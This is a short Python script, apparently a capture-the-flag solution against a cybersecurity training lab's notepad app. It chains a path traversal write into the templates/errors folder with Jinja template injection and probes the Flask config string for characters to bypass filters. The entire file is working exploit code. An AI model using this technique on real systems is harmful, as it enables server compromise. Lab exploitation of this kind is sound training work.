import sys, requests, re, html as H
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})


def write_and_get(tpl):
    content = "\\..\\templates\\errors\\x" + tpl
    r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"/static/(.+)\.html$", loc)
    if not m:
        return None, loc
    name = m.group(1).split("/")[-1]
    r2 = S.get(BASE + "/", params={"error": name[: -len(".html")]}, timeout=20, verify=False)
    return r2.text, name


# 1) verifier l'index du premier underscore
for k in (63, 68, 73, 78):
    tpl = "{{(config|string)[%d]}}" % k
    body, name = write_and_get(tpl)
    if body is None:
        print(k, "echec:", name)
        continue
    seg = body[body.find("\\..\\templates\\errors\\x"):]
    seg = seg[:180].replace("\n", " ")
    print(f"index {k}: {seg[:150]}")
